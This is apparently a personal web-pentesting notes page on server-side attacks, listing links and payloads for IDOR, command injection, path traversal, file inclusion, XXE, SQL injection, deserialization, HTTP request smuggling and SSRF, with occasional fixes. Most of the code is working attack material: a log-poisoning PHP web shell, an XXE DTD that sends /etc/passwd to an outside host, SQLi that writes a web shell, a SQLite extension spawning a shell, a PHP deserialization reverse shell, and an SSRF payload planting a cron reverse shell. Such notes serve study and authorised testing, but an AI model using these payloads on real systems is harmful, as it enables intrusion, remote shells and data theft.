## Doc - Server

### Per-language notes

- [Java](./Java.md)
- [NodeJS](./NodeJS.md)
- [PHP](./PHP.md)
- [Python](./Python.md)
- [Ruby](./Ruby.md)
- [flask_website](./flask_website) - example Flask app
- [polyglot.php](./polyglot.php) / [polyglot.svg](./polyglot.svg) - polyglot file examples ([../lamp_server](./lamp_server) for a full stack setup)
- [OWASP Cheatsheet Series - Top 10](https://cheatsheetseries.owasp.org/IndexTopTen.html)
- [Top 10 PortSwigger 2023](https://portswigger.net/polls/top-10-web-hacking-techniques-2023)
- https://github.com/xl7dev/BurpSuite
- https://github.com/paragonie/awesome-appsec
- https://book.hacktricks.xyz/todo/other-web-tricks
- https://cyber.gouv.fr/publications/securiser-un-site-web

### Cheatsheets

- https://websec.ca/sql-injection-knowledge-base/
- https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet
- https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work


## Tools

- [Burp](https://portswigger.net/burp)
- [CloudFlair](https://github.com/christophetd/CloudFlair)
- [Commix](https://github.com/commixproject/commix)
- [Curl (cheatsheet)](https://devhints.io/curl)
- [Evilarc](https://github.com/ptoomey3/evilarc)
- [Graphqlmap](https://github.com/swisskyrepo/GraphQLmap)
- [H2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [Jwt_tool](https://github.com/ticarpi/jwt_tool)
- [JWS](https://www.npmjs.com/package/jws)
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [Nuclei](https://red-security.fr/t/tutoriel-nuclei/92)
- [RSS Validator](https://validator.w3.org/feed/)
- [Tplmap](https://github.com/epinna/tplmap)
- [SQLmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [NoSQLmap](https://github.com/codingo/NoSQLMap)
- [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)


## API

### CRUD principles

- https://cloud.mongodb.com
- https://en.wikipedia.org/wiki/Create,_read,_update_and_delete
- https://www.geeksforgeeks.org/dbms/sql-server-crud-operations/

### REST

- https://swagger.io/
- https://fastapi.tiangolo.com/tutorial/first-steps/ # Python, simple
- https://www.baeldung.com/rest-with-spring-series   # Java, using Spring
- https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- https://learn.microsoft.com/en-us/microsoft-365/cloud-storage-partner-program/rest/ # WOPI : manages files in a cloud service

### GraphQL

 - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
 - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
 - https://ivangoncharov.github.io/graphql-voyager/

![](../images/api.gif)


## Broken Access Control

- [Insecure Direct Object References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
- [Password Reset Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-feature)
- [UUID - Sandwich Attack](https://github.com/Lupin-Holmes/sandwich)
- https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html

```bash
# IDOR
curl https://example:8000/profile/200
```

```txt
BURP -> Right Click -> Send to Intruder

#Intruder
- GET /$200$
- Payloads -> select numbers & range
- Settings -> Grep - Extract -> input html delimiters
- Save results to csv
```


```php
// example IDOR fix
if  ($user->getId() != this->getUser()->getId()){
  throw $this->createAccessDeniedException();
}

// better
#[Route('/profile', name: 'app_user_profile')]
public function profile(): Response{
  return $this->render(view:'user/index.html.twig', [
  'user' => $this->getUser(),
  ]);
}
```

### Bruteforce - Proxychains

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit#network-ipv4

### Oauth

- https://docs.authlib.org/en/stable/
- https://docs.authlib.org/en/stable/jose/jwt.html

#### JWT

- [Flask](./Python.md)
- https://jwt.io/
- https://rmrf.tips/en/ # 20 articles about JWT vulnerabities & cryptography
- https://superuser.com/questions/1419155/generating-jwt-rs256-signature-with-openssl
- https://github.com/ticarpi/jwt_tool/wiki


## Insecure code management

- https://httpd.apache.org/docs/current/howto/htaccess.html
- https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html
- https://owasp.org/www-project-devsecops-guideline/latest/01a-Secrets-Management
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces


## Command Injection

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection


### Blind

- https://mywiki.wooledge.org/Bashism # POSIX pitfalls
- https://www.gnu.org/software/bash/manual/html_node/Quoting.html
- https://portswigger.net/web-security/os-command-injection#blind-os-command-injection-vulnerabilities

```bash
# --form-string avoid interpreting @ and < => for raw binaries
curl http://example:8000/index.php -d 'arg=`curl -m1 http://example:8000/RCE`'

curl http://example:8000/index.php --form-string 'arg=`[ -f /etc/passwd ] && sleep 3`'
```


## Path Traversal

- https://owasp.org/www-community/attacks/Path_Traversal
- https://www.php.net/manual/en/function.str-replace.php
- https://docs.python.org/3/library/stdtypes.html#str.strip
- https://daniel.haxx.se/blog/2020/07/29/curl-ootw-path-as-is/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Zip%20Slip
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

```bash
curl http://example:8000/files/upload/../../../../etc/passwd --path-as-is
curl -X POST "http://example:8000/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
```

`Protection`:

- https://www.php.net/manual/fr/function.realpath.php

## File Inclusion

### Local & Remote File Inclusion (PHP)

- https://www.clever-age.com/owasp-local-remote-file-inclusion-lfi-rfi/
- https://humbertojunior.com.br/infosec/pentest/2021/02/16/lfi-parameters.html
- https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html

`Protection`: 

- https://www.php.net/manual/fr/function.realpath.php

```php
<?php
$file = basename(realpath($_GET["filename"]));
include("pages/$file");
?>
```

et `.htaccess`

`allow_url_include = Off` for PHP<7.4.0

### Log Poisoning

- https://bughra.dev/posts/log-poison/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
- https://web.archive.org/web/20120818120202/http://www.ghostsinthestack.org/article-26-bypasser-les-htaccess-avec-limit.html

```bash
curl http://example:8000/ -A "<?php system(\$_GET['cmd']);?>"
curl http://example:8000/test.php?page=/var/log/apache2/access.log&cmd=id
```

### XXE

- https://github.com/BuffaloWill/oxml_xxe
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file


#### Blind XXE, Exflitration Out of Band

- https://github.com/w181496/Web-CTF-Cheatsheet#out-of-band-oob-xxe
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-oob-with-dtd-and-php-filter
- **Method**:
  - create *docx* using `oxml_xxe`, edit  `word/document.xml` with `<!ENTITY % sp SYSTEM "http://public.domain:12345/a.dtd">`
  - `a.dtd`/`dtd.xml` content

```xml
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://public.domain:12345/a.dtd?%data;'>">
```

### Insecure File Uploads (Docx XXE to RCE, Imagetragick)

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file
- https://book.jorianwoltjer.com/web/server-side/imagemagick#profile-file-read-cve-2022-44268-less-than-7.1.0-50-oct-2022
- https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html


## SQLi

- https://phptherightway.com/#databases (`mysqli`|| `pdo` connectors)
- [MySQL Cheat (CRUD) Cheatsheet](https://gist.github.com/Prasundas99/c9abf1ef904ca5f35f970147d0d615a7)
- https://pentestmonkey.net/category/cheat-sheet/sql-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#ByPassingLoginScreens
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#SQLInjectionQuickChecks

### Boolean based blind/Error based/Stacked Queries/Union based/Time based blind SQLIs

- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet     # Database identification
- https://exploit-notes.hdks.org/exploit/web/sql-injection-cheat-sheet/
- https://exploit-notes.hdks.org/exploit/web/sql-injection-using-sqlmap/
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#StackingQueries
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#InsertPayloadSample


`Protection`:

- https://phpdelusions.net/mysqli_examples/prepared_select
- https://docs.python.org/3/library/sqlite3.html#sqlite3-placeholders
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- `mysqli::prepare`: https://websitebeaver.com/prepared-statements-in-php-mysqli-to-prevent-sql-injection
  - https://www.php.net/manual/en/mysqli.real-escape-string.php
  - https://www.php.net/manual/en/mysqli.prepare.php
  - https://dev.mysql.com/doc/c-api/8.0/en/c-api-prepared-statement-interface.html
- `PDO::prepare`: https://websitebeaver.com/php-pdo-prepared-statements-to-prevent-sql-injection
  - https://www.php.net/manual/en/pdo.prepared-statements.php
  - https://www.php.net/manual/en/pdo.setattribute.php#121309
  - https://stackoverflow.com/questions/10113562/pdo-mysql-use-pdoattr-emulate-prepares-or-not # turn off emulation mode for "real" prepared statements


#### Union based

- https://www.geeksforgeeks.org/pagination-in-sql/
- https://portswigger.net/web-security/sql-injection
- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/

```sql
# Database fingerprinting
' union select @@version,null ; mysql / mssql
' union select versionnumber,null from sysibm.sysversions ; db2
' union select version,null from v$instance ; oracle
' union select version(),null ; postgres
' union select null,null from sqlite_master; sqlite
```

```sql
1' ORDER BY 1-- - # True?
1' ORDER BY 4-- - # False? => 3 columns
1' GROUP BY 4-- - # False? => 3 columns

' UNION SELECT username FROM table LIMIT 1 OFFSET X-- - 0||1||2 etc..
```

```sql
?id = 1 UNION SELECT 0,0,0,0 -- -
' UNION SELECT 0,0,0,0 -- -

# ' UNION SELECT tbl_name FROM sqlite_master-- (sqlite)
' UNION SELECT 0,0,table_name,0 FROM information_schema.tables -- -

' UNION SELECT 0,0,column_name,0 FROM information_schema.columns WHERE table_name='chall' -- -

' UNION SELECT id, origine, message, 0 FROM chall -- -
```

#### Read / Write From File & RCE (SQLite, MySql)

- https://book.jorianwoltjer.com/web/server-side/sql-injection#rce-through-cli
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#BulkInsertFromFile
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#privilege-escalation-via-library

```sql
# Read file
UNION SELECT LOAD_FILE ("etc/passwd")-- 

# Write a file
UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-- -# /tmp/shell.php?cmd=id
```

```c
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1

#include <stdlib.h>
#include <unistd.h>

int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
  SQLITE_EXTENSION_INIT2(pApi);

  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell

  return SQLITE_OK;
}
```

```bash
gcc -s -g -fPIC -shared extension.c -o extension.so
#sqlite> select load_extension('./extension');
```

#### Blind

- https://www.sqlinjection.net/server-response/
- https://blog.ajxchapman.com/posts/2017/01/14/blind-sql-injection.html
- https://wiki.zenk-security.com/doku.php?id=failles_web:blind_sql_injection
- https://docs.python-requests.org/en/latest/user/quickstart/#redirection-and-history
- https://minimalblue.com/data/papers/ESTEL12_fast_SQL_blind_injections_in_high_latency_networks.pdf
- https://systemweakness.com/blind-sql-injection-exploitation-with-binary-search-using-python-c21e02fb1fa4
- https://web.archive.org/web/20120827032339/http://www.ghostsinthestack.org/article-11-blind-sql-injections.html

```sql
# Boolean based

admin' AND LENGTH(password)>=10-- -
admin' AND LENGTH(password)=10-- -

admin' AND (SELECT SUBSTR(password,1,1)='a')-- -
/*admin' and (SELECT SUBSTRING(password,1,1)='a')-- -*/

admin' AND (SELECT SUBSTR(password,1,3)='abc')-- -

?id = 1^(ascii(substring(password,(INDEX),1))<>(CHAR))
```

- https://www.sqlinjection.net/time-based/
- https://www.sqlinjection.net/heavy-query/

```sql
# Time based

1; SELECT SLEEP(10) FROM information_schema.tables WHERE table_name='users'-- - postgres
1; SELECT SLEEP(10) FROM users WHERE id=1 AND SUBSTRING(password,1,1)='a'-- -


?id = IF(SUBSTRING(password,1,1) = 'a', SLEEP(10), 0)-- -  0 <=> non existent id
1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(10), 0)-- -

## Heavy query
1 AND exists(SELECT password FROM users WHERE id=1 AND substring(password,1,1)='a') AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
```

### Fragmented

- https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/

### PDO prepared statements (Emulation MODE)

- https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/  # Test \'? and ?%00 escapes
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#pdo-prepared-statements

### Second Order

- https://portswigger.net/kb/issues/00100210_sql-injection-second-order
- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#SecondOrderSQLInjection
- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#second-order-sql-injection

### Bypass Filters

- https://websec.wordpress.com/tag/sql-filter-bypass/
- https://johnermac.github.io/notes/ewptx/sqlievasion/
- http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/


```sql 
# Bypass comma
SUBSTRING(password from 1 for 1)

## (UNION SELECT 1,2,3,4)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d

# Bypass equal
LIKE(0x61)

# Bypass substring
MID(password,1,1)

# Bypass quotes
ascii(MID(password from 1 for 1))=65
table_name=chr(117)||chr(115)||chr(101)||chr(114)||chr(115)-- -

# Bypass stacked
' UNION SELECT 0x73272067726f757020627920322d2d2064-- -

# Bypass spaces
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- -

# Bypass whitespace
%20 %09 %0a %0b %0c %0d %a0 /**/
```

### Others

#### NoSQLI

- https://www.dailysecurity.fr/nosql-injections-classique-blind/
- https://www.mongodb.com/docs/manual/reference/mql/query-predicates/
- https://www.mongodb.com/community/forums/t/unrecognized-pipeline-stage-name-search/111883

```nosql
## predicates
usr_name[$ne]=h4cker&usr_password[$regex]=^m
usr_name[$ne]=h4cker&usr_password[$regex]=m.{2}

## pipeline injection

https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22flag%22,%22as%22:%22str%22,%22foreignField%22:%22flag%22,%22localField%22:%22flag
```

#### LDAP injection

- https://wiki.zenk-security.com/doku.php?id=failles_web:ldap_injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

#### XPATH injection

- https://wiki.zenk-security.com/doku.php?id=failles_web:xpath_injection
- https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html
- https://owasp.org/www-community/attacks/XPATH_Injection


## Server Side Template Injection

- https://github.com/vladko312/Research_Successful_Errors/
- https://cheatsheet.hackmanit.de/template-injection-table/

### ASP, Elixir, Java, JS, PHP, Python, Ruby

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection
- https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/

### Golang

- https://github.com/w181496/Web-CTF-Cheatsheet#golang

## Insecure Deserialization

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/

### Java - Serializable and deserializetoBytearray

- https://github.com/frohoff/ysoserial
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
- https://www.synacktiv.com/publications/java-deserialization-tricks

### Node 

#### Serialize

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md

#### Prototype Pollution

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html

### PHP

#### Serialize

- https://github.com/ambionics/phpggc
- https://www.owasp.org/index.php/PHP_Object_Injection
- https://www.saotn.org/exploit-php-mail-get-remote-code-execution/

```php
<?php
class Token{
    public $encode_algo="anything";
    // exploiting toString() magic method
    public $decode_algo="shell_exec";
    // using php for a stable shell
    public $msg='php${IFS}-r${IFS}\'$s=fsockopen(<IP>,<PORT>);$p=proc_open("/bin/sh",[0=>$s,1=>$s,2=>$s],$x);\'';
}
echo urlencode(serialize([new Token()]));
``` 

#### File Upload - PHAR wrapper deserialization

- https://www.nc-lp.com/blog/disguise-phar-packages-as-images
- https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html


### Python

#### Yaml

- https://book.hacktricks.wiki/en/pentesting-web/deserialization/python-yaml-deserialization.html

#### Pickle

- https://exploit-notes.hdks.org/exploit/web/framework/pickle-rce/
- https://docs.python.org/3/library/pickle.html#object.__reduce__
- https://stackoverflow.com/questions/23582489/python-pickle-protocol-choice
- https://stackoverflow.com/questions/7501947/understanding-pickling-in-python

```python
#protocol <= 2: python2, 2<protocol<=4: python3
token = base64.b64encode(pickle.dumps(Exploit(), protocol=0))
```

### Ruby

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md

### .NET

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md


## HTTP Request Smuggling

- https://franso.re/fr/blog/http_rs_pour_les_nuls
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling
- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/advanced
- https://book.jorianwoltjer.com/web/server-side/http-request-smuggling

Root cause: frontend (proxy/LB/CDN) and backend disagree on where a request ends -> desync -> attacker's smuggled tail glues onto the next victim's request on the same reused connection.

### CL.TE / TE.CL / TE.TE

```txt
CL.TE - frontend uses Content-Length, backend uses Transfer-Encoding
TE.CL - frontend uses Transfer-Encoding, backend uses Content-Length
TE.TE - both support TE, one obfuscated so it gets ignored by one side
```

Poisoning `/submissions` cache / stealing next victim's creds (CL.TE):

```http
POST / HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 158
Transfer-Encoding: chunked
Connection: keep-alive

0

POST /contact.php HTTP/1.1
Host: httprequestsmuggling.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

username=test&query=
```

`Burp Intruder` settings:
- Sniper, payload position at end of smuggled inner request (`query=§§`)
- Payload set: **Null payloads, generate 1000** (fires base request N times, no substitution needed)
- **Resource Pool**: max 1 concurrent request, **Request delay 2000ms + random delay** -> serializes onto same backend connection, lets each desync settle before next shot, avoids race noise

### HTTP/2 -> HTTP/1.1 downgrade desync (h2.CL / h2.TE)

![](./images/http2_desync.png)

`Repeater`, two "requests" stacked in one H2 stream tab (frontend downgrades H2 to H1 using declared `Content-Length`; the second faux-request has no H1 framing of its own so it gets smuggled):

```http
POST / HTTP/2
Host: 10.128.158.123:8000
Content-Length: 0

GET /post/like/12315198742342 HTTP/1.1
X: f
```

Backend queues the `GET`, waits for the real next request on the same reused connection -> victim's cookie attaches, `GET` fires as them. No CSRF token needed.

### HTTP/2 request tunneling

- CVE-2019-19330 (HAProxy/Nginx H2->H1 request splitting): https://www.cve.org/CVERecord?id=CVE-2019-19330
- https://portswigger.net/research/http2
- https://github.com/BishopFox/h2csmuggler

Add a header field (`Foo: bar`) in Repeater, then edit its value in place with `Shift+Enter` — inserts a literal `\r\n` inside the H2 field, since H2 framing has no line-based terminator to stop it — to inject a full raw HTTP/1.1 request the frontend forwards to the backend as-is.

#### Leaking internal headers

```http
POST /hello HTTP/2
Host: 10.128.158.123:8100
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Foo:bar
```

Edit `bar` (`Shift+Enter` for `\r\n`):

```txt
bar
Host: 10.128.158.123:8100

POST /hello HTTP/1.1
Content-Length: 300
Host: 10.128.158.123:8100
Content-Type: application/x-www-form-urlencoded
```

Backend handles both requests -> response leaks internal-only headers the frontend normally strips.

#### Bypassing frontend access restrictions

```http
POST /hello HTTP/2
Host: 10.128.158.123:8100
User-Agent: Mozilla/5.0
Foo: bar
```

`bar` edited to:

```txt
bar
Host: 10.128.158.123:8100
Content-Length: 0

GET /admin HTTP/1.1
X-Fake: a
```

Frontend ACL only inspects the outer H2 path (`/hello`) and passes it; backend parses the tunneled `GET /admin` separately -> restriction bypassed.

`Protection`: terminate H2 at edge with strict RFC 9113 conformance (reject `\r`/`\n`/`:` in header values), avoid H1 downgrade where possible, keep frontend/backend on the same parser (same vendor+version), disable connection reuse across trust boundaries, prefer H2-end-to-end.


## Server Side Request Forgery

- [DNS Rebinding](https://github.com/4nuit/Hacking/tree/master/network#dns-rebinding)
- https://www.dailysecurity.fr/server-side-request-forgery/
- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

```bash
file://index.php
file:///etc/passwd

for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://example:$i" | grep 'Content-Length'| xargs echo "$i:"; done
dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
```

```bash
# fs : filter response size , matches != 2000
ffuf -c -w `fzf-wordlists` -X POST -u "http://$TARGET/" -d 'fetch=http://example:8080/FUZZ' 
ffuf -c -w `fzf-wordlists` -X POST -u "http://$TARGET/" -d 'fetch=http://example:8000/FUZZ'  -fs 2000
```

### Edge side include

- https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html

### Virtual Host Confusion

- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection

```bash
# accessing remote ip using foo.example:8000

curl -v --resolve foo.example:8000:<ip> http://foo.example:8000
chromium  --host-resolver-rules="MAP foo.example <ip>" --user-data-dir=/tmp/chrome-test
```
